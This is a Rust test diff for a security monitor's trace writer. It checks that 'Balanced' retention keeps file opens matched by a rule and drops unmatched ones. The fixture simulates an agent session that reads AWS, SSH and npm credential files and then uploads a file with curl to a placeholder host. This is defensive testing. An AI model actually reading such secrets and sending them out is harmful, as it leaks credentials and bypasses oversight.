@@ -786,3 +786,166 @@ fn the_writer_can_write_to_any_destination() {
     assert!(stats.kept > 0 && stats.dropped > 0);
     assert_eq!(out.text().lines().count() as u64, stats.kept);
 }
+
+// ---------------------------------------------------------------------------
+// What `Balanced` keeps of a file open and a connection
+// ---------------------------------------------------------------------------
+
+/// Makes the file action of an open.
+fn open_action(path: &str) -> Action {
+    Action::FileOpen {
+        path: path.to_string(),
+        write: false,
+    }
+}
+
+/// Makes the event of an open that a process makes.
+fn open_event(pid: Pid, path: &str) -> Event {
+    event(
+        EventKind::FileOpen {
+            path: path.to_string(),
+            write: false,
+        },
+        pid,
+    )
+}
+
+/// Makes the decision event that the firewall emits after an action.
+fn action_decision(pid: Pid, action: Action, matches: Vec<RuleMatch>) -> Event {
+    event(
+        EventKind::PolicyDecision {
+            action: Box::new(action),
+            verdict: Box::new(Verdict::from_matches(matches)),
+            ancestry: Vec::new(),
+        },
+        pid,
+    )
+}
+
+/// Makes a match of the level `info` that only writes something down.
+fn info_match(rule_id: &str) -> RuleMatch {
+    RuleMatch {
+        rule_id: rule_id.to_string(),
+        title: "a credential store was read".to_string(),
+        category: "memory".to_string(),
+        risk: RiskLevel::Info,
+        decision: Decision::Allow,
+        reason: "the session read a stored credential".to_string(),
+    }
+}
+
+/// The event stream of the credential chain, exactly as a live session emits
+/// it: the action first, and the decision of that action directly after it.
+fn credential_chain() -> Vec<Event> {
+    let mut events = vec![event(
+        EventKind::SessionStart {
+            meta: Box::new(session_meta()),
+            capabilities: Vec::new(),
+        },
+        1000,
+    )];
+    events.push(exec(1001, 1000, "/usr/bin/node", &["node", "agent.js"], 11));
+    for path in [
+        "/home/dev/.aws/credentials",
+        "/home/dev/.ssh/id_ed25519",
+        "/home/dev/.npmrc",
+    ] {
+        events.push(open_event(1001, path));
+        events.push(action_decision(
+            1001,
+            open_action(path),
+            vec![info_match("memory.credentials.read-mark")],
+        ));
+    }
+    // Ordinary work: an open that no rule matched. The firewall records no
+    // decision for it at all.
+    events.push(open_event(1001, "/home/dev/app/src/main.rs"));
+    events.push(exec(
+        1002,
+        1001,
+        "/usr/bin/curl",
+        &["curl", "-T", "out.txt", "https://files.example.com/u"],
+        12,
+    ));
+    events.push(event(
+        EventKind::SessionEnd {
+            exit_code: Some(0),
+            process_count: 3,
+        },
+        1000,
+    ));
+    events
+}
+
+/// The promise of `Balanced`: an action that a rule matched stays.
+///
+/// A rule of the level `info` counts. The mark of a credential read is such a
+/// rule, and the session memory of a replay is built from exactly those
+/// events. Before this behaviour existed, a chain that the live session found
+/// replayed to nothing.
+#[test]
+fn balanced_keeps_a_file_open_that_a_rule_matched() {
+    let dir = temp_dir();
+    let path = dir.path().join("balanced-chain.jsonl");
+    let events = credential_chain();
+    write_trace(&path, Retention::Balanced, &events);
+
+    let back = read_trace(&path).expect("read");
+    let opens: Vec<String> = back
+        .iter()
+        .filter_map(|event| match &event.kind {
+            EventKind::FileOpen { path, .. } => Some(path.clone()),
+            _ => None,
+        })
+        .collect();
+    assert_eq!(
+        opens,
+        vec![
+            "/home/dev/.aws/credentials".to_string(),
+            "/home/dev/.ssh/id_ed25519".to_string(),
+            "/home/dev/.npmrc".to_string(),
+        ],
+        "every open that a rule matched must stay, and only those:\n{back:#?}"
+    );
+    // The trace keeps one order and one numbering.
+    let numbers: Vec<u64> = back.iter().map(|event| event.seq).collect();
+    assert_eq!(numbers, (1..=back.len() as u64).collect::<Vec<u64>>());
+    // The held event goes out before the decision that released it.
+    let first_open = back
+        .iter()
+        .position(|event| matches!(event.kind, EventKind::FileOpen { .. }))
+        .expect("the trace holds an open");
+    assert!(
+        first_open > 0,
+        "the exec of the process stands before its first open"
+    );
+}
+
+/// A held action that gets no decision of its own goes away.
+#[test]
+fn balanced_drops_a_file_open_that_no_rule_matched() {
+    let out = Shared::default();
+    let mut writer = TraceWriter::to_writer(out.clone(), Retention::Balanced);
+    let events = credential_chain();
+    for event in &events {
+        writer.record(event).expect("record");
+    }
+    writer.flush().expect("flush");
+
+    let text = out.text();
+    assert!(
+        !text.contains("main.rs"),
+        "an open that no rule matched must not reach storage:\n{text}"
+    );
+    let stats = writer.stats();
+    assert_eq!(
+        stats.kept + stats.dropped,
+        events.len() as u64,
+        "the counters must add up to the events that the writer saw"
+    );
+    assert_eq!(
+        text.lines().count() as u64,
+        stats.kept,
+        "the file holds exactly the events that the writer kept"
+    );
+}
